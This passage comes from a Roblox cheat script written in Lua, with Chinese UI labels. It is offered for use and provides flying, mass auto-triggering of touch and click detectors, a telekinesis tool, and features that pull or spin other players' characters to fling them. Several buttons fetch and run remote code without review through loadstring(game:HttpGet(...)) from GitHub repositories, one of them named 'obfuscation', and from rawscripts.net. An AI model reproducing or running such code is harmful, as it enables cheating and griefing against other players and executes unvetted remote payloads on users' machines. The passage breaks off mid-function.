    humanoidRootPart = character:WaitForChild("HumanoidRootPart")
end
RefreshChar()
player.CharacterAdded:Connect(RefreshChar)

local function simulateTouch(part)
    if part and part:IsA("BasePart") and humanoidRootPart then
        firetouchinterest(humanoidRootPart, part, 0)
        task.wait(0.1)
        firetouchinterest(humanoidRootPart, part, 1)
    end
end

local function simulateClick(clickDetector)
    if clickDetector and clickDetector:IsA("ClickDetector") then
        clickDetector:FireServer()
    end
end

local function StartScan()
    running = true
    scanThread = task.spawn(function()
        while running do
            for _, instance in pairs(game:GetDescendants()) do
                if not running then break end
                if instance:IsA("BasePart") then
                    if instance:FindFirstChildOfClass("TouchTransmitter") then
                        simulateTouch(instance)
                    end
                    local clickDetector = instance:FindFirstChildOfClass("ClickDetector")
                    if clickDetector then
                        simulateClick(clickDetector)
                    end
                end
            end
            task.wait(scanDelay)
        end
    end)
end

local function StopScan()
    running = false
end

Tabs.InteractTab:Toggle({
    Title = "自动触发触摸/点击",
    Value = false,
    Callback = function(state)
        if state then
            StartScan()
        else
            StopScan()
        end
    end
})

Tabs.InteractTab:Input({
    Title = "间隔",
    Value = "0.1",
    Placeholder = "输入数字，例：0.05",
    Callback = function(inputText)
        local num = tonumber(inputText)
        if num and num > 0 then
            scanDelay = num
        end
    end
})

Tabs.VehicleFlyTab:Toggle({
    Title = "开启飞行",
    Value = false,
    Callback = function(state)
        local Players = game:GetService("Players")
        local plr = Players.LocalPlayer

        getgenv().flyEnv = {
            flying = false,
            flyThread = nil,
            ctrl = {f = 0, b = 0, l = 0, r = 0, u = 0, d = 0},
            lastctrl = {f = 0, b = 0, l = 0, r = 0},
            maxspeed = 50,
            speed = 0,
            bg = nil,
            bv = nil
        }
        local env = getgenv().flyEnv

        local function GetRoot()
            local char = plr.Character or plr.CharacterAdded:Wait()
            return char:WaitForChild("HumanoidRootPart")
        end

        local function StartFly()
            local HumanoidRootPart = GetRoot()
            local hum = plr.Character:WaitForChild("Humanoid")
            env.bg = Instance.new("BodyGyro", HumanoidRootPart)
            env.bg.P = 90000
            env.bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
            env.bg.CFrame = HumanoidRootPart.CFrame
            env.bv = Instance.new("BodyVelocity", HumanoidRootPart)
            env.bv.Velocity = Vector3.new(0,0.1,0)
            env.bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
            env.flyThread = task.spawn(function()
                while env.flying do
                    hum.PlatformStand = true
                    if env.ctrl.l + env.ctrl.r ~= 0 or env.ctrl.f + env.ctrl.b ~= 0 or env.ctrl.u + env.ctrl.d ~=0 then
                        env.speed = env.speed+.5+(env.speed/env.maxspeed)
                        if env.speed > env.maxspeed then
                            env.speed = env.maxspeed
                        end
                    elseif env.speed ~= 0 then
                        env.speed = env.speed-1
                        if env.speed < 0 then
                            env.speed = 0
                        end
                    end
                    if (env.ctrl.l + env.ctrl.r) ~= 0 or (env.ctrl.f + env.ctrl.b) ~=0 or (env.ctrl.u + env.ctrl.d)~=0 then
                        local lookV = workspace.CurrentCamera.CFrame.LookVector * (env.ctrl.f+env.ctrl.b)
                        local sideV = (workspace.CurrentCamera.CFrame * CFrame.new(env.ctrl.l+env.ctrl.r,(env.ctrl.f+env.ctrl.b)*0.2,0).Position) - workspace.CurrentCamera.CFrame.Position
                        local upV = Vector3.new(0, env.ctrl.u + env.ctrl.d, 0)
                        env.bv.Velocity = (lookV + sideV + upV)*env.speed
                        env.lastctrl = {f = env.ctrl.f, b = env.ctrl.b, l = env.ctrl.l, r = env.ctrl.r}
                    elseif env.speed ~= 0 then
                        env.bv.Velocity = ((workspace.CurrentCamera.CFrame.LookVector * (env.lastctrl.f+env.lastctrl.b)) + ((workspace.CurrentCamera.CFrame * CFrame.new(env.lastctrl.l+env.lastctrl.r,(env.lastctrl.f+env.lastctrl.b)*0.2,0).Position) - workspace.CurrentCamera.CFrame.Position))*env.speed
                    else
                        env.bv.Velocity = Vector3.new(0,0.1,0)
                    end
                    env.bg.CFrame = workspace.CurrentCamera.CFrame * CFrame.Angles(-math.rad((env.ctrl.f+env.ctrl.b)*50*env.speed/env.maxspeed),0,0)
                    task.wait()
                end
                env.ctrl = {f = 0, b = 0, l = 0, r = 0, u = 0, d = 0}
                env.lastctrl = {f = 0, b = 0, l = 0, r = 0}
                env.speed = 0
                if env.bg then env.bg:Destroy() end
                if env.bv then env.bv:Destroy() end
                hum.PlatformStand = false
            end)
        end

        env.flying = state
        if state then
            StartFly()
        else
            env.ctrl = {f = 0, b = 0, l = 0, r = 0, u = 0, d = 0}
        end
    end
})

Tabs.VehicleFlyTab:Input({
    Title = "飞行最大速度",
    Placeholder = "输入数字，默认50",
    Default = "50",
    Callback = function(text)
        local env = getgenv().flyEnv
        if not env then return end
        local num = tonumber(text)
        if num then
            env.maxspeed = math.clamp(num,1,999)
        end
    end
})

Tabs.VehicleFlyTab:Divider()

Tabs.VehicleFlyTab:Button({
    Title = "前进",
    Callback = function()
        local env = getgenv().flyEnv
        if not env then return end
        env.ctrl.f = 1
        task.wait(0.15)
        env.ctrl.f = 0
    end
})
Tabs.VehicleFlyTab:Button({
    Title = "后退",
    Callback = function()
        local env = getgenv().flyEnv
        if not env then return end
        env.ctrl.b = -1
        task.wait(0.15)
        env.ctrl.b = 0
    end
})
Tabs.VehicleFlyTab:Button({
    Title = "左移",
    Callback = function()
        local env = getgenv().flyEnv
        if not env then return end
        env.ctrl.l = -1
        task.wait(0.15)
        env.ctrl.l = 0
    end
})
Tabs.VehicleFlyTab:Button({
    Title = "右移",
    Callback = function()
        local env = getgenv().flyEnv
        if not env then return end
        env.ctrl.r = 1
        task.wait(0.15)
        env.ctrl.r = 0
    end
})
Tabs.VehicleFlyTab:Button({
    Title = "上升",
    Callback = function()
        local env = getgenv().flyEnv
        if not env then return end
        env.ctrl.u = 1
        task.wait(0.15)
        env.ctrl.u = 0
    end
})
Tabs.VehicleFlyTab:Button({
    Title = "下降",
    Callback = function()
        local env = getgenv().flyEnv
        if not env then return end
        env.ctrl.d = -1
        task.wait(0.15)
        env.ctrl.d = 0
    end
})
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local function spawnTelekinesis()
    local toolName = "心灵操控工具"
    local new = Instance.new
    local vec = Vector3.new

    local tool = new("Tool")
    tool.Name = toolName

    local handle = new("Part")
    handle.Name = "Handle"
    handle.Size = vec(0.1,0.1,0.1)
    handle.Transparency = 1
    handle.CanCollide = false
    handle.Parent = tool

    local mainLocalScript = new("LocalScript")
    mainLocalScript.Name = "CoreScript"
    mainLocalScript.Parent = tool
    mainLocalScript.Source = [[
local tool = script.Parent
local handle = tool.Handle
local mouse = game.Players.LocalPlayer:GetMouse()
local RunService = game:GetService("RunService")

local targetPart = nil
local pullRange = 30
local bodyPos = nil
local currentHighlight = nil

_G.TeleAddDist = function() pullRange += 5 end
_G.TeleSubDist = function() if pullRange >=5 then pullRange -=5 end end
_G.TeleSet15 = function() pullRange =15 end
_G.TeleSet100 = function() pullRange =100 end
_G.TeleSetMax = function() pullRange =5000 end
_G.TeleRotate = function()
    if not targetPart then return end
    local ang = Instance.new("BodyAngularVelocity")
    ang.AngularVelocity = Vector3.new(0,8,0)
    ang.MaxTorque = Vector3.new(99999,99999,99999)
    ang.Parent = targetPart
    task.delay(0.8,function() ang:Destroy() end)
end
_G.TeleUpPush = function()
    if not targetPart then return end
    local vel = Instance.new("BodyVelocity")
    vel.Velocity = Vector3.new(0,25,0)
    vel.MaxForce = Vector3.new(99999,99999,99999)
    vel.Parent = targetPart
    task.delay(0.4,function() vel:Destroy() end)
end
_G.TeleFreeze = function()
    if not targetPart then return end
    targetPart:SetVelocity(Vector3.new(0,0,0))
    local ang = targetPart:FindFirstChildOfClass("BodyAngularVelocity")
    if ang then ang:Destroy() end
end

local function removeHighlight()
    if currentHighlight then
        currentHighlight:Destroy()
        currentHighlight = nil
    end
end

local function createHighlight(part)
    removeHighlight()
    local hl = Instance.new("Highlight")
    hl.FillTransparency = 1
    hl.OutlineColor = Color3.new(1,1,1)
    hl.OutlineTransparency = 0
    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    hl.Parent = part
    currentHighlight = hl
end

local connectLoop
tool.Equipped:Connect(function()
    connectLoop = RunService.RenderStepped:Connect(function()
        if mouse.Target and mouse.Target.CanCollide and mouse.Target ~= handle then
            targetPart = mouse.Target
            createHighlight(targetPart)
            if not bodyPos or bodyPos.Parent ~= targetPart then
                bodyPos = Instance.new("BodyPosition")
                bodyPos.MaxForce = Vector3.new(99999,99999,99999)
                bodyPos.Parent = targetPart
            end
            bodyPos.Position = mouse.Hit.Position + mouse.Hit.LookVector * pullRange
        else
            removeHighlight()
            if bodyPos then bodyPos:Destroy() end
            targetPart = nil
        end
    end)
end)

tool.Unequipped:Connect(function()
    if connectLoop then connectLoop:Disconnect() end
    removeHighlight()
    if bodyPos then bodyPos:Destroy() end
    targetPart = nil
end)
]]

    local clonedTool = tool:Clone()
    clonedTool.Parent = Players.LocalPlayer.Backpack
end

Tabs.ObjectCtrlTab:Button({
    Title = "生成心灵操控工具",
    Callback = spawnTelekinesis
})
Tabs.ObjectCtrlTab:Divider()
Tabs.ObjectCtrlTab:Button({
    Title = "牵引距离+5",
    Callback = function()
        _G.TeleAddDist()
    end
})
Tabs.ObjectCtrlTab:Button({
    Title = "牵引距离-5",
    Callback = function()
        _G.TeleSubDist()
    end
})
Tabs.ObjectCtrlTab:Button({
    Title = "固定距离15",
    Callback = function()
        _G.TeleSet15()
    end
})
Tabs.ObjectCtrlTab:Button({
    Title = "固定距离100",
    Callback = function()
        _G.TeleSet100()
    end
})
Tabs.ObjectCtrlTab:Button({
    Title = "距离拉满5000",
    Callback = function()
        _G.TeleSetMax()
    end
})
Tabs.ObjectCtrlTab:Divider()
Tabs.ObjectCtrlTab:Button({
    Title = "物体旋转",
    Callback = function()
        _G.TeleRotate()
    end
})
Tabs.ObjectCtrlTab:Button({
    Title = "向上弹射",
    Callback = function()
        _G.TeleUpPush()
    end
})
Tabs.ObjectCtrlTab:Button({
    Title = "冻结物体",
    Callback = function()
        _G.TeleFreeze()
    end
})

Tabs.Music:Divider()

local enableSpectrum = false
local rainbowSpectrum = false

Tabs.Music:Toggle({
    Title = "启用音频频谱可视化",
    Value = false,
    Callback = function(state)
        enableSpectrum = state
    end
})

Tabs.Music:Toggle({
    Title = "彩虹频谱",
    Value = false,
    Callback = function(state)
        rainbowSpectrum = state
    end
})

Tabs.Music:Divider()

local audioId = ""
Tabs.Music:Input({
    Title = "音频AssetID",
    Value = "",
    Placeholder = "粘贴音乐rbxassetid数字",
    Callback = function(val)
        audioId = val
    end
})

Tabs.Music:Divider()

local musicVolume = "0.5"
Tabs.Music:Input({
    Title = "音量 0‑1",
    Value = "0.5",
    Placeholder = "输入0~1数值",
    Callback = function(val)
        musicVolume = val
    end
})

Tabs.Music:Button({
    Title = "▶播放音乐",
    Callback = function()
        if audioId == "" then return end
        local SoundService = game:GetService("SoundService")
        local playingAudio = nil
        local spectrumGui = nil
        local spectrumBars = {}
        local spectrumConn = nil

        local function CleanUpSpectrum()
            if spectrumConn then
                spectrumConn:Disconnect()
                spectrumConn = nil
            end
            if spectrumGui then
                spectrumGui:Destroy()
                spectrumGui = nil
            end
            table.clear(spectrumBars)
        end

        local function BuildSpectrum()
            CleanUpSpectrum()
            local RunService = game:GetService("RunService")
            spectrumGui = Instance.new("ScreenGui")
            spectrumGui.Name = "MusicSpectrum"
            spectrumGui.ResetOnSpawn = false
            spectrumGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            spectrumGui.Parent = LocalPlayer.PlayerGui

            local container = Instance.new("Frame")
            container.Size = UDim2.new(1,0,0,90)
            container.Position = UDim2.new(0,0,1,-90)
            container.BackgroundTransparency = 1
            container.Parent = spectrumGui

            local uiList = Instance.new("UIListLayout")
            uiList.FillDirection = Enum.FillDirection.Horizontal
            uiList.HorizontalAlignment = Enum.HorizontalAlignment.Center
            uiList.VerticalAlignment = Enum.VerticalAlignment.Bottom
            uiList.Padding = UDim.new(0,3)
            uiList.Parent = container

            local barCount = 24
            for i=1,barCount do
                local bar = Instance.new("Frame")
                bar.Size = UDim2.new(0,8,0,4)
                bar.BackgroundTransparency = 0
                bar.BorderSizePixel = 0
                bar.Parent = container
                local grad = Instance.new("UIGradient")
                grad.Rotation = 90
                grad.Color = ColorSequence.new(Color3.fromRGB(0,180,255), Color3.fromRGB(120,0,255))
                grad.Parent = bar
                table.insert(spectrumBars, bar)
            end

            local smoothValues = table.create(barCount,0)
            local smoothingFactor = 0.12

            spectrumConn = RunService.RenderStepped:Connect(function()
                if not playingAudio or not playingAudio.Playing then
                    for idx,bar in ipairs(spectrumBars) do
                        smoothValues[idx] *= 0.85
                        bar.Size = UDim2.new(0,8,0, smoothValues[idx])
                    end
                    return
                end
                local rawAmp = math.clamp(playingAudio.PlaybackLoudness / 320,0,1)
                for idx,bar in ipairs(spectrumBars) do
                    local phase = tick()*2.4 + idx*0.28
                    local bandAmp = rawAmp * (0.4 + math.abs(math.sin(phase))*0.6)
                    smoothValues[idx] += (bandAmp*75 - smoothValues[idx]) * smoothingFactor
                    local h = smoothValues[idx]
                    bar.Size = UDim2.new(0,8,0,h)

                    if rainbowSpectrum then
                        local rainbowHue = (tick() * 1.2 + idx * 0.18) % 1
                        bar.UIGradient.Color = ColorSequence.new(
                            Color3.fromHSV(rainbowHue, 0.9, 1),
                            Color3.fromHSV((rainbowHue + 0.25) % 1, 0.9, 1)
                        )
                    else
                        local hue = 0.55 + (h/90)*0.35
                        bar.UIGradient.Color = ColorSequence.new(
                            Color3.fromHSV(hue,0.85,0.9),
                            Color3.fromHSV(hue+0.18,0.9,1)
                        )
                    end
                end
            end)
        end

        for _,v in ipairs(SoundService:GetChildren()) do
            if v:IsA("Sound") and v.Name == "CustomPlayerSound" then
                v:Stop()
                v:Destroy()
            end
        end

        local vol = tonumber(musicVolume) or 0.5
        local sound = Instance.new("Sound")
        sound.Name = "CustomPlayerSound"
        sound.SoundId = "rbxassetid://"..audioId
        sound.Volume = math.clamp(vol,0,1)
        sound.Looped = true
        sound.Parent = SoundService
        sound:Play()
        playingAudio = sound

        if enableSpectrum then
            BuildSpectrum()
        end

        sound.Destroying:Connect(function()
            CleanUpSpectrum()
        end)
    end
})

Tabs.Music:Button({
    Title = "■停止音乐",
    Callback = function()
        local SoundService = game:GetService("SoundService")
        for _,v in ipairs(SoundService:GetChildren()) do
            if v:IsA("Sound") and v.Name == "CustomPlayerSound" then
                v:Stop()
                v:Destroy()
            end
        end
    end
})

Tabs.Music:Button({
	Title = "网易云音乐",
	Callback = function()		
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/obfuscation/refs/heads/main/music"))()
    end
})
Tabs.BodyScaleTab:Button({
	Title = "r15",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/rspy-but-back/refs/heads/main/okokok"))()
	end 
})

Tabs.BodyScaleTab:Button({
	Title = "巨人",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/rspy-but-back/refs/heads/main/luyannbnbnb"))()
	end 
})

Tabs.BodyScaleTab:Button({
	Title = "r6",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/rspy-but-back/refs/heads/main/yesyesyes"))()
	end 
})

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local targetPlayer = nil
local loopConn = nil
local originalPos = nil 

Tabs.NewTab2:Dropdown({
    Title = "选择目标玩家",
    Values = (function()
        local list = {}
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr ~= lp then
                table.insert(list,plr.Name.." | "..plr.DisplayName)
            end
        end
        return list
    end)(),
    Value = "",
    Callback = function(selectStr)
        local userName = string.split(selectStr, " | ")[1]
        local targetPlr = Players:FindFirstChild(userName)
        if not targetPlr then
            Window:Notification({Title="错误",Message="未找到该玩家",Duration=2})
            targetPlayer = nil
            originalPos = nil
            return
        end
        targetPlayer = targetPlr
        originalPos = nil
        Window:Notification({Title="选中成功",Message="已锁定："..targetPlr.DisplayName,Duration=1.2})
    end
})

Tabs.NewTab2:Button({
    Title = "刷新玩家列表",
    Callback = function()
        local list = {}
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr ~= lp then
                table.insert(list,plr.Name.." | "..plr.DisplayName)
            end
        end
        Tabs.NewTab2.Dropdowns["选择目标玩家"]:SetValues(list)
        Window:Notification({Title="刷新成功",Message="玩家列表已更新",Duration=1})
    end
})

Tabs.NewTab2:Toggle({
	Title = "吸附至我头顶",
	Default = false,
	Callback = function(state)
		if state then
			if loopConn then return end
			if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
				originalPos = targetPlayer.Character.HumanoidRootPart.CFrame
			end

			loopConn = game:GetService("RunService").Heartbeat:Connect(function()
				if not lp.Character then return end
				local myRoot = lp.Character:FindFirstChild("HumanoidRootPart")
				if not myRoot then return end
				if not targetPlayer or not targetPlayer:IsDescendantOf(Players) then
					if loopConn then
						loopConn:Disconnect()
						loopConn = nil
					end
					return
				end
				local tChar = targetPlayer.Character
				if not tChar then return end
				local tRoot = tChar:FindFirstChild("HumanoidRootPart")
				if not tRoot then return end

				tRoot.CFrame = myRoot.CFrame * CFrame.new(0,3.2,0)
			end)
		else
			if loopConn then
				loopConn:Disconnect()
				loopConn = nil
			end
			if targetPlayer and targetPlayer:IsDescendantOf(Players) then
				local tChar = targetPlayer.Character
				if tChar then
					local tRoot = tChar:FindFirstChild("HumanoidRootPart")
					if tRoot and originalPos then
						tRoot.CFrame = originalPos
					end
				end
			end
			originalPos = nil 
		end
	end
})

local savedPlaceId = ""

Tabs.NewTab2:Input({
    Title = "数字ID传送",
    Placeholder = "输入PlaceId，例如:2E",
    Default = "",
    Callback = function(val)
        savedPlaceId = val
    end
})

Tabs.NewTab2:Button({
	Title = "执行ID传送",
	Callback = function()
		if tonumber(savedPlaceId) then
			game:GetService("TeleportService"):Teleport(tonumber(savedPlaceId))
		end
	end 
})

local kickMsg = "9178"
local errMsg = "大家9178"

Tabs.NewTab2:Input({
    Title = "自定义踢出内容",
    Placeholder = "",
    Default = "9178",
    Callback = function(val)
        kickMsg = val
    end
})

Tabs.NewTab2:Input({
    Title = "自定义错误代码",
    Placeholder = "",
    Default = "大家9178",
    Callback = function(val)
        errMsg = val
    end
})

Tabs.NewTab2:Button({
	Title = "执行自定义踢出",
	Callback = function()
        local lp = game.Players.LocalPlayer
        lp:Kick(kickMsg)
	end 
})

local winTitle = ""
local winBody = ""

Tabs.NewTab2:Input({
    Title = "弹窗标题",
    Placeholder = "输入弹窗标题",
    Default = "",
    Callback = function(val)
        winTitle = val
    end
})

Tabs.NewTab2:Input({
    Title = "弹窗内容",
    Placeholder = "输入弹窗内容",
    Default = "",
    Callback = function(val)
        winBody = val
    end
})

Tabs.NewTab2:Button({
	Title = "弹出确认窗口",
	Callback = function()
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = winTitle,
            Text = winBody,
            Duration = 5
        })
	end 
})

local savedRespawnCFrame = nil

Tabs.NewTab2:Button({
	Title = "设置当前为重生点",
	Callback = function()
		local lp = game.Players.LocalPlayer
		local char = lp.Character
		if char and char:FindFirstChild("HumanoidRootPart") then
			savedRespawnCFrame = char.HumanoidRootPart.CFrame
		end
	end 
})

Tabs.NewTab2:Button({
	Title = "原地复活(跳保存点)",
	Callback = function()
		local lp = game.Players.LocalPlayer
		if not savedRespawnCFrame then return end

		lp:LoadCharacter()

		task.spawn(function()
			local newChar = lp.CharacterAdded:Wait()
			local hrp = newChar:WaitForChild("HumanoidRootPart")
			hrp.CFrame = savedRespawnCFrame
		end)
	end 
})

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local spinTarget = nil
local SpinConn = nil
local SpinSpeed = 18

Tabs.NewTab2:Dropdown({
    Title = "旋转‑选择玩家",
    Values = (function()
        local list = {}
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr ~= lp then
                table.insert(list, plr.Name.." | "..plr.DisplayName)
            end
        end
        return list
    end)(),
    Value = "",
    Callback = function(selectStr)
        local userName = string.split(selectStr, " | ")[1]
        local targetPlr = Players:FindFirstChild(userName)
        if not targetPlr then
            Window:Notification({Title="错误",Message="未找到该玩家",Duration=2})
            spinTarget = nil
            return
        end
        spinTarget = targetPlr
        Window:Notification({Title="选中成功",Message="旋转锁定："..targetPlr.DisplayName,Duration=1.2})
    end
})

Tabs.NewTab2:Button({
    Title = "刷新玩家列表",
    Callback = function()
        local list = {}
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr ~= lp then
                table.insert(list, plr.Name.." | "..plr.DisplayName)
            end
        end
        Tabs.NewTab2.Dropdowns["旋转‑选择玩家"]:SetValues(list)
        Window:Notification({Title="刷新成功",Message="玩家列表已更新",Duration=1})
    end
})

Tabs.NewTab2:Input({
    Title = "旋转速度",
    Value = "18",
    Placeholder = "数值越大转越快",
    Callback = function(input)
        SpinSpeed = tonumber(input) or 18
    end
})

Tabs.NewTab2:Toggle({
    Title = "开启旋转",
    Default = false,
    Callback = function(state)
        if state then
            if SpinConn then return end
            SpinConn = game:GetService("RunService").Heartbeat:Connect(function()
                if not spinTarget then
                    if SpinConn then
                        SpinConn:Disconnect()
                        SpinConn = nil
                    end
                    return
                end
                local char = spinTarget.Character
                if not char then return end
                local root = char:FindFirstChild("HumanoidRootPart")
                if not root then return end

                local ang = os.clock() * SpinSpeed
                root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, ang, 0)
                root.Velocity = Vector3.new(math.cos(ang)*60,35,math.sin(ang)*60)
            end)
        else
            if SpinConn then
                SpinConn:Disconnect()
                SpinConn = nil
            end
        end
    end
})

local RunService = game:GetService("RunService")
local lp = game.Players.LocalPlayer
local conn

local function ToggleAntiFling(state)
    if state then
        if conn then return end
        conn = RunService.Heartbeat:Connect(function()
            local char = lp.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not (hrp and hum) then return end

            hrp.Velocity = Vector3.new(0, hrp.Velocity.Y, 0)
            hrp.RotVelocity = Vector3.new(0,0,0)
        end)
    else
        if conn then
            conn:Disconnect()
            conn = nil
        end
    end
end

Tabs.y:Toggle({
	Title = "客户端防甩飞",
	Icon = "shield",
	Default = false,
	Callback = function(state)
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local lp = Players.LocalPlayer

		if not getgenv().AntiFling then
			getgenv().AntiFling = {
				Active = false,
				Connection = nil
			}
		end

		local function resetCharacter(char, lastPos)
			local hum = char:FindFirstChildOfClass("Humanoid")
			local root = char:FindFirstChild("HumanoidRootPart")
			if not hum or not root then return end
			root.Velocity = Vector3.new(0,0,0)
			root.RotVelocity = Vector3.new(0,0,0)
			root.CFrame = CFrame.new(lastPos)
			for _,v in ipairs(char:GetChildren()) do
				if v:IsA("BodyVelocity") or v:IsA("BodyAngularVelocity") or v:IsA("BodyForce") then
					pcall(function() v:Destroy() end)
				end
			end
		end

		if state then
			getgenv().AntiFling.Active = true
			local char = lp.Character
			if not char then return end
			local hum = char:FindFirstChildOfClass("Humanoid")
			local root = char:FindFirstChild("HumanoidRootPart")
			if not hum or not root then return end

			local lastPosition = root.Position
			local flagCooldown = 0

			getgenv().AntiFling.Connection = RunService.RenderStepped:Connect(function()
				if not getgenv().AntiFling.Active then return end
				if not root:IsDescendantOf(workspace) then return end

				local now = tick()
				local velMag = root.Velocity.Magnitude
				local moveDelta = (root.Position - lastPosition).Magnitude

				local speedLimit = 130
				local teleportLimit = 30

				if velMag > speedLimit or moveDelta > teleportLimit then
					if now - flagCooldown > 1 then
						flagCooldown = now
						resetCharacter(char, lastPosition)
					end
				end
				lastPosition = root.Position
			end)
		else
			getgenv().AntiFling.Active = false
			if getgenv().AntiFling.Connection then
				getgenv().AntiFling.Connection:Disconnect()
				getgenv().AntiFling.Connection = nil
			end
		end
	end,
})

Tabs.NinjaTab:Input({
    Title = "执行器图标ID",
    Placeholder = "填写图片数字ID",
    Default = "77694975974567",
    Callback = function(val)
        getgenv().image = val
    end
})

Tabs.NinjaTab:Input({
    Title = "设置图标ID",
    Placeholder = "填写图片数字ID",
    Default = "86514272233336",
    Callback = function(val)
        getgenv().sidebar_settings = val
    end
})

Tabs.NinjaTab:Input({
    Title = "脚本中心图标ID",
    Placeholder = "填写图片数字ID",
    Default = "81336437484712",
    Callback = function(val)
        getgenv().sidebar_scripthub = val
    end
})

Tabs.NinjaTab:Input({
    Title = "首页图标ID",
    Placeholder = "填写图片数字ID",
    Default = "70601561680786",
    Callback = function(val)
        getgenv().sidebar_home = val
    end
})

Tabs.NinjaTab:Input({
    Title = "执行器标签图标ID",
    Placeholder = "填写图片数字ID",
    Default = "77105040222682",
    Callback = function(val)
        getgenv().sidebar_executor = val
    end
})

Tabs.NinjaTab:Input({
    Title = "控制台图标ID",
    Placeholder = "填写图片数字ID",
    Default = "107685407615094",
    Callback = function(val)
        getgenv().sidebar_console = val
    end
})

Tabs.NinjaTab:Button({
    Title = "应用Delta自定义图标",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/CustomDelta.lua'))()
    end
})

Tabs.NinjaTab:Divider()

Tabs.NinjaTab:Button({
	Title = "ClearAllAccessories",
	Callback = function()
		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")
		
		humanoid:RemoveAccessories()
	end
})

Tabs.NinjaTab:Button({
	Title = "无头短腿",
	Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Permanent-Headless-And-korblox-Script-4140"))()
	end 
})

Tabs.NinjaTab:Button({
	Title = "八位皇家王冠",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 10159600649
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "八位血条",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 10159610478
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "八位章鱼",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 507795810
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "红色多米诺皇冠",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 42211680
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "天使翅膀",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 192557913
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "毒角",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 1744060292
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "冰角",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 74891470
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
